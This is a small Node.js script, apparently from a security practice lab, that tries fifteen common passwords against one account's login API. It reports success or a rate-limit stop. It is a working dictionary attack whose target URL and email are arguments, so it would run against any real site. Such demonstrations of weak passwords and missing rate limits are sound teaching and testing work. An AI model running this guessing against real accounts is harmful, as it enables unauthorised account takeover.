// Try a short list of common passwords against one account. Practice app only.
// Usage: node guess-password.mjs <base-url> <email>
const [base = 'http://127.0.0.1:18401', email = 'bob@pocket.test'] = process.argv.slice(2);
const words = ['123456', 'password', '123456789', 'qwerty', '12345678', '111111', 'iloveyou',
  'admin', 'welcome', 'monkey', 'dragon', 'letmein', 'football', 'sunshine', 'princess'];
const started = Date.now();
for (const [i, password] of words.entries()) {
  const res = await fetch(`${base}/api/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  console.log(`${String(i + 1).padStart(2)}  ${password.padEnd(10)} ${res.status}`);
  if (res.status === 200) {
    console.log(`found ${email} / ${password} after ${i + 1} attempts in ${Date.now() - started} ms`);
    break;
  }
  if (res.status === 429) {
    console.log(`stopped: rate limited, retry after ${res.headers.get('retry-after')} seconds`);
    break;
  }
}
